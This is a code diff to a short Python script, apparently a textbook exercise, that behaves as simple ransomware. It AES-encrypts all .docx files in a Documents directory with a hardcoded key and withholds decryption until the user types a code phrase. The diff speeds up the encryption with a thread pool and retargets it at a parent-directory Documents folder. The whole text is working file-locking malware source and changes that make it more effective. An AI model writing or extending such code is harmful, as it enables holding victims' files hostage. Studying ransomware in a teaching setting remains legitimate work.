@@ -1,6 +1,9 @@
 from pathlib import Path
 from Crypto.Cipher import AES
 import os
+from concurrent.futures import (
+    ThreadPoolExecutor,
+)
 
 key = b"Sixteen byte key"
 iv = os.urandom(16)
@@ -42,20 +45,19 @@ def getFiles(directory, ext):
     return paths
 
 
-directory = os.path.join(os.getcwd(), "Documents")
+directory = os.path.join(os.getcwd(), "../Documents")
 ext = ".docx"
 paths = getFiles(directory, ext)
-for path in paths:
-    encryptFile(path)
+
+with ThreadPoolExecutor() as executor:
+    executor.map(encryptFile, paths)
 
 while True:
     print("Enter decryption code: ")
     code = input().rstrip()
     if code == "Decrypt files":
         paths = getFiles(directory, ".docx.encrypted")
-        for path in paths:
-            file_name = str(path).rstrip(".encrypted")
-            decryptFile(
-                file_name
-            )  # says decryptFile(path) in the book, pretty sure its file_name...
+        file_names = [str(path).rstrip(".encrypted") for path in paths]
+        with ThreadPoolExecutor() as executor:
+            executor.map(decryptFile, file_names)
         break
